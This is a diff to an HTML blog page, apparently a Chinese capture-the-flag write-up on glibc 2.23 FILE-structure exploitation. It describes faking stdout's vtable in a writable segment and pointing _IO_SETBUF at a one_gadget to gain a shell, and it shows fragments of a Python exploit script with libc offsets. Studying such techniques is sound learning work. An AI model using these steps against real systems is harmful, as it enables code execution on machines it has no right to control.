@@ -342,7 +342,7 @@ _IO_str_finish (_IO_FILE *fp, <span class="type">int</span> dummy)
 <p>本地patch 2.23</p>
 <p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202406102038387.png" alt="image-20240610203831160"></p>
 <p>将vtable迁移到可写段上，我们可以改 _IO_OVERFLOW\_IO_SETBUF为one_gadget，最后执行链子1\2获取shell</p>
-<p>设置stdout._chain域作为_IO_OVERFLOW\_IO_SETBUF，通过偏移函数在虚表中的偏移来计算得到fake_vtable_addr</p>
+<p>设置_IO_OVERFLOW\_IO_SETBUF地址，通过偏移函数在虚表中的偏移来计算得到fake_vtable_addr</p>
 <p>打_IO_SETBUF，成功执行到one_gadget了，但是栈的问题没有执行，试了几个都没用</p>
 <p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202406102110358.png" alt="image-20240610211016997"></p>
 <pre><code class="highlight python"><span class="comment">#coding:utf-8</span>
@@ -381,8 +381,8 @@ _IO_str_finish (_IO_FILE *fp, <span class="type">int</span> dummy)
     <span class="built_in">print</span>(<span class="built_in">hex</span>(ori4))
 
     stdout_vtable = libc_base + <span class="number">0x3c56f8</span>    <span class="comment">#--&gt;fake_vtable</span>
-    fake_vtable_addr = libc_base + <span class="number">0x3c5588</span> <span class="comment">#0x3c5630    #fake_vtable-&gt;0x58 =  _IO_setbuf_t</span>
-    setbuf = libc_base + <span class="number">0x3c55e0</span>           <span class="comment">#0x3c5688</span>
+    fake_vtable_addr = libc_base + <span class="number">0x3c5588</span> <span class="comment">#fake_vtable-&gt;0x58 =  _IO_setbuf_t</span>
+    setbuf = libc_base + <span class="number">0x3c55e0</span>           
     
     leak(<span class="string">&quot;stdout_vtable&quot;</span>, stdout_vtable)
     leak(<span class="string">&quot;fake_vtable&quot;</span>, fake_vtable_addr)
